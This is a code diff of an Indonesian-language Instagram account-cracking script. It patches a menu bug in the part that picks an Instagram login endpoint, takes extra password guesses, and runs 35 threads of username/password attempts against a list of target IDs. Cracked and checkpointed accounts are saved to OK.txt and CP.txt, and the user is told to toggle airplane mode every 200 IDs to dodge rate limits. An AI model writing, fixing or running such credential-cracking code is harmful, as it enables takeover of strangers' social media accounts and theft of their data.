@@ -485,24 +485,27 @@ def cccrack():
 	
 def crack():
 	print('\n')
-	method = []
+	method = []  # Ini tetap list
 	console.print(Panel(f"""{P2}[{color_text}01{P2}]. Crack Menggunakan Methode i.instagram.com
 {P2}[{color_text}02{P2}]. Crack Menggunakan Methode www.instagram.com
-{P2}[{color_text}03{P2}]. Crack Menggunakan Methode api.instagram.com""",width=60, title="METHOD", style=f"{color_panel}"))
-	method = Console().input(f" {H2}• {P2}Masukan : ")
-	if method in ['01','1']: 
+{P2}[{color_text}03{P2}]. Crack Menggunakan Methode api.instagram.com""", width=60, title="METHOD", style=f"{color_panel}"))
+	
+	user_input = Console().input(f" {H2}• {P2}Masukan : ")  # Jangan timpa 'method'
+
+	if user_input in ['01', '1']: 
 		method.append("api")
-	elif method in ['02','2']: 
+	elif user_input in ['02', '2']: 
 		method.append("ini")
-	elif method in ['03','3']: 
+	elif user_input in ['03', '3']: 
 		method.append("www")
-	elif method in ['04','4']: 
+	elif user_input in ['04', '4']: 
 		method.append("bi")
 	else:
 		method.append("api")
-	apsw(method)
 
+	apsw(method)  # Kirim method (list) sebagai argumen
 	
+
 def apsw(method):
 	global iniapabree, kaloinijugaapa
 	console.print(f'\n {H2}• {P2}Tambah Password Sendiri? (y/t)')
@@ -511,20 +514,26 @@ def apsw(method):
 		console.print(f' {H2}• {P2}Gunakan koma buat pemisah')
 		paswd = console.input(f' {H2}• {P2}Masukan : ')
 		for y in paswd.split(','):
-			if len(y) <=5:pass
-			else:pw_add.append(y)
-	else:pass
-	console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lambat\n{P2}[{color_text}02{P2}]. Cepat""",width=60, title="MENU FAST/SLOW", style=f"{color_panel}"))
+			if len(y) <=5: pass
+			else: pw_add.append(y)
+	else: pass
+
+	console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lambat
+{P2}[{color_text}02{P2}]. Cepat""", width=60, title="MENU FAST/SLOW", style=f"{color_panel}"))
 	lib = console.input(f' {H2}• {P2}Masukan : ')
-	if lib in ['1','01']:login.update({'Lib':'htx'})
-	else:login.update({'Lib':'req'})
+	if lib in ['1','01']: login.update({'Lib':'htx'})
+	else: login.update({'Lib':'req'})
+
 	urut = []
-	urut.append(panel(f'[bold green]OK/OK.txt [bold white]',width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
-	urut.append(panel(f'[bold yellow]CP/CP.txt [bold white]',width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
+	urut.append(panel(f'[bold green]OK/OK.txt [bold white]', width=30, title=f"[bold green]OK SAVE", style=f"{color_panel}"))
+	urut.append(panel(f'[bold yellow]CP/CP.txt [bold white]', width=30, title=f"[bold yellow]CP SAVE", style=f"{color_panel}"))
 	console.print(Columns(urut))
-	Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]200[bold yellow] ID ',title=f"[bold yellow]CRACK-FANKY-GANTENG",width=60,style=f"{color_panel}"))
+
+	Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]200[bold yellow] ID ', title=f"[bold yellow]CRACK-FANKY-GANTENG", width=60, style=f"{color_panel}"))
+
 	iniapabree = Progress(TextColumn('{task.description}'))
-	kaloinijugaapa = iniapabree.add_task('',total=len(fanids))
+	kaloinijugaapa = iniapabree.add_task('', total=len(fanids))
+
 	with iniapabree:
 		with ThreadPoolExec(max_workers=35) as fannjha:
 			for i in fanids:
@@ -540,16 +549,18 @@ def apsw(method):
 					fannjha.submit(threads, username, password)
 				else:
 					fannjha.submit(api_insta, username, password)
+
 	if success == 0 and checkpoint == 0:
 		console.print(f' {H2}• {P2}Maaf Bree Kamu Gk Dapat Hasil')
 		exit()
 	else:
-		Console().print(Panel(f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",subtitle="╭───",subtitle_align="left",title=f"[bold green]FINISH",width=60,style=f"{color_panel}"))
+		Console().print(Panel(f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng", subtitle="╭───", subtitle_align="left", title=f"[bold green]FINISH", width=60, style=f"{color_panel}"))
 		Console().print(f"[bold cyan]   ╰[bold green] OK ─> {success}	[bold yellow]CP ─> {checkpoint}")
 		print("")
 		exit()
-	quit(0)
 
+	quit(0)
+	
 def generate(name):
     xxx = []
     if len(pw_add) >=1:
